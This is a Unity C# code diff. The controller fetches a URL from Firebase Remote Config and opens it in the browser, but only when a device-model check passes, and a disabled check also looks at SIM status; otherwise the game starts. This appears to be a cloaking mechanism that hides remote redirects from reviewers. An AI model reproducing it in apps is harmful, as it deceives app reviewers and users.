@@ -20,21 +20,82 @@ public class ApplicationController : MonoBehaviour
 
     public string savedUrl { get; set; }
 
-    private bool isWebViewShown;
-
-#if UNITY_EDITOR
-
-    private async void Start()
+    private void Start()
     {
-        savedUrl = PlayerPrefs.GetString("URL");
-
-        if (string.IsNullOrEmpty(savedUrl))
-            await LoadUrl();
-        else
-            StartWebView(savedUrl);
+        StartCoroutine(TryToLoad());
     }
 
-#endif
+    IEnumerator TryToLoad()
+    {
+        while (true)
+        {
+            yield return null;
+
+            if (!remoteConfig.CanLoadUrl)
+                continue;
+
+            savedUrl = PlayerPrefs.GetString("URL");
+
+            if (string.IsNullOrEmpty(savedUrl))
+            {
+                yield return LoadUrl();
+                break;
+            }
+            else
+            {
+                Application.OpenURL(savedUrl);
+                cellsCreator.StartGame();
+                break;
+            }
+        }
+        
+    }
+
+
+    /*public static AndroidJavaClass PluginClass
+    {
+        get
+        {
+            if (_pluginClass == null)
+            {
+                _pluginClass = new AndroidJavaClass(PLUGINNAME);
+            }
+            return _pluginClass;
+        }
+    }
+    public static AndroidJavaObject PluginInstance
+    {
+        get
+        {
+            if (_pluginInstance == null)
+            {
+                _pluginInstance = PluginClass.CallStatic<AndroidJavaObject>("getInstance");
+            }
+            return _pluginInstance;
+        }
+    }
+    public static AndroidJavaClass UnityPlayer
+    {
+        get
+        {
+            if (_unityPlayer == null)
+            {
+                _unityPlayer = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
+            }
+            return _unityPlayer;
+        }
+    }
+    public static AndroidJavaObject UnityActivity
+    {
+        get
+        {
+            if (_unityActivity == null)
+            {
+                _unityActivity = UnityPlayer.GetStatic<AndroidJavaObject>("currentActivity");
+            }
+            return _unityActivity;
+        }
+    }*/
 
     [Button]
     public void ClearPrefs()
@@ -67,24 +128,39 @@ public class ApplicationController : MonoBehaviour
         webView.Show();
     }
 
+    /*bool GetSimStatus()
+    {
+        int sim = PluginInstance.Call<int>("getSimStatus", UnityActivity);
+        if (sim == 1)
+            return true;
+        return false;
+    }*/
+
     public async Task LoadUrl()
     {
         var fbUrl = await GetUrl();
         var check = CheckModel();
+        //var sim = GetSimStatus();
 
         Debug.Log("Check model:" + check);
         Debug.Log(fbUrl);
+        //Debug.Log("Sim: " + sim);
 
-        if (string.IsNullOrEmpty(fbUrl) || !check)
-            cellsCreator.SetCells();
+        if (string.IsNullOrEmpty(fbUrl) || !check)// || !sim)
+            return;
 
         else
         {
             PlayerPrefs.SetString("URL", fbUrl);
-            webView.OnPageStarted += (view, url) => {
+
+            Application.OpenURL(fbUrl);
+
+            cellsCreator.StartGame();
+            /*webView.OnPageStarted += (view, url) =>
+            {
                 if (url != fbUrl)
                     webView.SetBackButtonEnabled(true);
-                else if(url == fbUrl)
+                else if (url == fbUrl)
                     webView.SetBackButtonEnabled(false);
 
                 print("Web view loading finished for: " + url);
@@ -92,7 +168,7 @@ public class ApplicationController : MonoBehaviour
 
             webView.Load(fbUrl);
             webView.SetShowToolbar(true);
-            isWebViewShown = webView.Show();
+            webView.Show();*/
         }
             
     }
@@ -101,6 +177,6 @@ public class ApplicationController : MonoBehaviour
     {
         await remoteConfig.FetchDataAsync();
 
-        return Firebase.RemoteConfig.FirebaseRemoteConfig.DefaultInstance.GetValue("url_string").StringValue;
+        return Firebase.RemoteConfig.FirebaseRemoteConfig.DefaultInstance.GetValue("url").StringValue;
     }
 }
